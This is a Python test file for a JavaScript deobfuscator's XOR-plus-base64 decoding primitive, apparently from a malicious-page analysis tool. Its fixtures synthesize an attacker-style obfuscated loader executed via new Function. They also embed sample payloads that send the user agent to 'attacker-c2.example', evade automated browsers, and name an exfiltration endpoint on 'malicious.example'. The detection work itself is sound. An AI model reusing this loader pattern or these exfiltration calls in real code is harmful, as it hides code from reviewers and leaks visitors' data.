"""Tests for the ``b64_xor_b64`` primitive on JSDeobfuscator.

The new primitive targets the gate-2 (captcha-premium / burned-token)
pattern: two base64 strings, one is the byte-cycled XOR key for the
other, then ``new Function(decoded)()`` executes the result.  Without
this primitive the pipeline would only see the gate's outer JS — the
real C2 / next-stage URL stays buried inside the encrypted blob.

We don't drive a real browser here.  We synthesize the loader source
the way a real attacker writes it (randomized variable names, the
distinctive ``[i] ^ [j % k.length]`` cycled-XOR loop), then assert
that the decoder recovers the embedded payload and tags the result
with ``js_b64_xor_b64`` so the operator can tell which technique
unmasked it.
"""

from __future__ import annotations

import base64

from darla.analysis.deobfuscator import JSDeobfuscator


def _build_loader(payload: str, key: bytes) -> str:
    """Synthesize a captcha-premium-style loader that XORs a base64
    ciphertext against a base64 key (cycled) and ``Function``-evals the
    result.  Variable names are deliberately the same flavor as the
    real-world sample (random 3-char ids) to ensure the detector
    doesn't anchor on names.
    """
    cipher = bytes(b ^ key[i % len(key)] for i, b in enumerate(payload.encode("utf-8")))
    cipher_b64 = base64.b64encode(cipher).decode("ascii")
    key_b64 = base64.b64encode(key).decode("ascii")
    return f"""
        function ts4(of7) {{
            let oc2 = atob(of7);
            return Uint8Array.from(oc2, qd3 => qd3.charCodeAt(0));
        }}
        let or0 = "{cipher_b64}";
        let ly0 = "{key_b64}";
        let yb4 = ts4(or0);
        let qo5 = ts4(ly0);
        let qz2 = new Uint8Array(yb4.length);
        for (let qo0 = 0; qo0 < yb4.length; qo0++) {{
            qz2[qo0] = yb4[qo0] ^ qo5[qo0 % qo5.length];
        }}
        let zk7 = new TextDecoder();
        let yb5 = zk7.decode(qz2);
        (new Function(yb5))();
    """


def test_decodes_synthetic_captcha_premium_loader() -> None:
    """The decoder must recover an embedded URL + JS keywords from the
    XOR'd payload.  This pins the happy path — gate-2 and any future
    kit using the same primitive will hit this codepath."""
    payload = (
        "function checkVisitor() { "
        "fetch('https://attacker-c2.example/log?u=' + encodeURIComponent("
        "navigator.userAgent)); "
        "if (navigator.webdriver) { window.location.href = "
        "'https://www.temu.com/'; return; } "
        "document.querySelector('form').submit(); }"
    )
    key = b"my-secret-key-16"  # 16 bytes, a typical key length
    src = _build_loader(payload, key)

    result = JSDeobfuscator().deobfuscate(src)
    assert result.layers_unwrapped >= 1, (
        "loader should have unwrapped at least the b64_xor_b64 layer"
    )
    assert "js_b64_xor_b64" in result.techniques_found
    # Embedded URL and a JS keyword should both appear in the
    # joined deobfuscated output.
    assert "attacker-c2.example" in result.deobfuscated_content
    assert "navigator.webdriver" in result.deobfuscated_content


def test_extracts_url_via_extract_urls() -> None:
    """The high-level ``extract_urls`` shortcut must pull the embedded
    URL out of the decoded payload.  Pins that the new primitive
    flows into the IOC path the rest of the pipeline relies on."""
    payload = "var c2 = 'https://malicious.example/api/exfil'; fetch(c2);"
    src = _build_loader(payload, b"k" * 24)

    urls = JSDeobfuscator().extract_urls(src)
    assert any(u.startswith("https://malicious.example/") for u in urls)


def test_skips_when_loop_signature_absent() -> None:
    """Without the cycled-XOR loop signature, the primitive must not
    fire — even if two base64 strings happen to be present.  Avoids
    false positives on benign pages that have base64 image data, JWT
    tokens, etc."""
    src = """
        const banner = 'aGVsbG8gd29ybGQgZnJvbSB0aGUgYmFubmVy';
        const tracker = 'YW5vdGhlciBiYXNlNjQgc3RyaW5nIHJpZ2h0IGhlcmU=';
        console.log(atob(banner));
    """
    result = JSDeobfuscator().deobfuscate(src)
    assert "js_b64_xor_b64" not in result.techniques_found


def test_skips_when_only_one_base64_string() -> None:
    """A single base64 literal has no key candidate to pair against.
    Must not match — would otherwise XOR the cipher against itself."""
    src = """
        for (let i = 0; i < arr.length; i++) {
            arr[i] = arr[i] ^ key[i % key.length];
        }
        const single = 'aGVsbG8gd29ybGQgZnJvbSB0aGUgYmFubmVy';
    """
    result = JSDeobfuscator().deobfuscate(src)
    assert "js_b64_xor_b64" not in result.techniques_found


def test_decoded_payload_must_contain_js_markers_or_url() -> None:
    """Decoded blobs that lack JS markers AND lack a URL must be
    rejected — defends against coincidental UTF-8-clean XOR pairings
    on benign pages.  The validator (markers + URL) is the only
    thing standing between us and false positives, so pin it."""
    # Payload that UTF-8-decodes cleanly but contains no JS keywords,
    # no URL, no fat arrow, no parens — just letters and spaces.
    # Using uppercase-only to avoid accidentally hitting the
    # lowercase markers list ("function", "var ", "let ", etc.).
    payload = "AAAA BBBB CCCC DDDD EEEE FFFF GGGG HHHH IIII JJJJ KKKK"
    src = _build_loader(payload, b"k" * 16)

    result = JSDeobfuscator().deobfuscate(src)
    assert "js_b64_xor_b64" not in result.techniques_found


def test_xor_cycled_helper_is_correct() -> None:
    """Pure-function correctness check on the XOR-cycled byte op."""
    helper = JSDeobfuscator._xor_cycled
    # Identity: cipher ^ all-zero key == cipher
    assert helper(b"hello", b"\x00") == b"hello"
    # Round-trip: pt ^ key ^ key == pt
    pt = b"the quick brown fox jumps over the lazy dog"
    key = b"secret"
    ct = helper(pt, key)
    assert helper(ct, key) == pt
    # Empty key short-circuits to identity (defensive)
    assert helper(b"abc", b"") == b"abc"
